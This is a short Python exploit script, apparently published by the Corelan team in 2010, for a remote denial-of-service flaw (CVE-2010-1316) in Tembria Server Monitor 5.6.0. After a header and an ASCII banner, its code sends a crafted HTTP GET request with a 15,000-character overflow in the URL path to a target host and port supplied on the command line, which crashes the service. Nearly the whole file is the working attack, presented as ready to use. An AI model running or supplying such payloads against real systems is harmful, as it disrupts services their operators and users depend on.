#!/usr/bin/python
# Exploit Title : Tembria Server Monitor 5.6.0
# CVE-ID        : CVE-2010-1316
# Date          : April 9, 2010
# Author        : Lincoln
# Software Link : http://www.tembria.com/
# Version       : 5.6.0
# OS            : Windows
# Tested on     : XP SP3 En (VirtualBox)
# Type of vuln  : Remote DoS
# Greetz to     : Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
#
# Note : you are not allowed to edit/modify this code.
# If you do, Corelan cannot be held responsible for any damages this may cause.
#
#
print "|------------------------------------------------------------------|"
print "|                         __               __                      |"
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
print "|                                                                  |"
print "|                                       http://www.corelan.be:8800 |"
print "|                                                                  |"
print "|                                                                  |"
print "|-------------------------------------------------[ EIP Hunters ]--|"
print "\n[+] Exploit for Tembria Server Monitor 5.6.0"

import socket,sys

#usage ./filename.py IP PORT

host = sys.argv[1]
port = int(sys.argv[2]) #80

buf = "GET /tembria/index.asp/"  + "B" * 15000  + " A" + " HTTP/1.1\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print "[+] DoS packet sent!\n"
s.send(buf)
s.close()